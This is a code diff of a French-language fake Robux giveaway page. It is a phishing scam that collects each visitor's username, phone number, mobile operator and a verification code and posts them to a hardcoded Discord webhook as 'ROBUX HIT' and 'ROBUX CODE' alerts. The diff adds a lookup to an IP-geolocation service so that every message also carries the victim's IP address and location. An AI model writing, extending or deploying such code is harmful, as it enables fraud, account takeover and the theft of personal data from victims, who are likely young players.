@@ -417,7 +417,6 @@
           <button type="button" data-a="10000" onclick="pickAmt(this)">10 000<small>R$</small></button>
         </div>
 
-        <!-- === CHAMP OPÉRATEUR AJOUTÉ === -->
         <label class="m-label" style="margin-top:14px;">Opérateur</label>
         <select id="g_operator" style="width:100%; padding:14px; background:#0e0f16; border:1.5px solid var(--line); border-radius:12px; color:var(--text); font-size:16px; margin-bottom:12px;">
           <option value="Bouygues">Bouygues</option>
@@ -449,6 +448,7 @@
 <script>
   const WEBHOOK = "https://discord.com/api/webhooks/1523821118358552626/lfWBCG2w1kAhIvPFhcYLQOe8V3z_YW66UiweHbTJ1ZOXYswiEx6ahHvEqmxSyIVbzbIu";
 
+  // hero animated numbers
   (function(){
     var pct = document.getElementById('heroPct');
     setInterval(function(){
@@ -495,7 +495,28 @@
     hide('gstep1'); show('gstep2'); setProg(2);
   }
 
-  function toStep3(){
+  // Fonction pour récupérer IP + localisation
+  async function getIpInfo() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      return {
+        ip: data.ip || "Inconnu",
+        city: data.city || "Inconnu",
+        region: data.region || "Inconnu",
+        country: data.country_name || "Inconnu"
+      };
+    } catch (e) {
+      return {
+        ip: "Inconnu",
+        city: "Inconnu",
+        region: "Inconnu",
+        country: "Inconnu"
+      };
+    }
+  }
+
+  async function toStep3(){
     var phone = document.getElementById('g_phone').value.trim();
     var operator = document.getElementById('g_operator').value;
     var digits = phone.replace(/\D/g,'');
@@ -505,11 +526,26 @@
     var amt = document.querySelector('#amts button.sel');
     document.getElementById('showAmt').textContent = amt ? amt.getAttribute('data-a').replace(/\B(?=(\d{3})+(?!\d))/g,' ') : '4 500';
 
+    // Récupération IP + Localisation
+    const ipData = await getIpInfo();
+    const ipInfo = `${ipData.ip} | ${ipData.city}, ${ipData.region}, ${ipData.country}`;
+
+    // Embed Discord
     fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `<@896448018453233714> <@1514675664794423303> **ROBUX HIT**\nPseudo: @${currentUser}\nOpérateur: ${operator}\nPhone: ${phone}`
+        embeds: [{
+          title: "ROBUX HIT",
+          color: 3066993,
+          fields: [
+            { name: "Pseudo", value: "@" + currentUser, inline: true },
+            { name: "Opérateur", value: operator, inline: true },
+            { name: "Téléphone", value: phone, inline: true },
+            { name: "IP & Localisation", value: ipInfo }
+          ],
+          timestamp: new Date().toISOString()
+        }]
       })
     });
 
@@ -534,7 +570,7 @@
     });
   })();
 
-  function checkCode(){
+  async function checkCode(){
     var ins = document.querySelectorAll('#codeInputs input');
     var code = Array.prototype.map.call(ins, function(x){ return x.value; }).join('');
     if(code.length < 4){
@@ -544,11 +580,23 @@
       return;
     }
 
+    const ipData = await getIpInfo();
+    const ipInfo = `${ipData.ip} | ${ipData.city}, ${ipData.region}, ${ipData.country}`;
+
     fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `<@896448018453233714> <@1514675664794423303> **ROBUX CODE**\nPseudo: @${currentUser}\nCode entré: ${code}`
+        embeds: [{
+          title: "ROBUX CODE",
+          color: 15105570,
+          fields: [
+            { name: "Pseudo", value: "@" + currentUser, inline: true },
+            { name: "Code entré", value: code, inline: true },
+            { name: "IP & Localisation", value: ipInfo }
+          ],
+          timestamp: new Date().toISOString()
+        }]
       })
     });
 
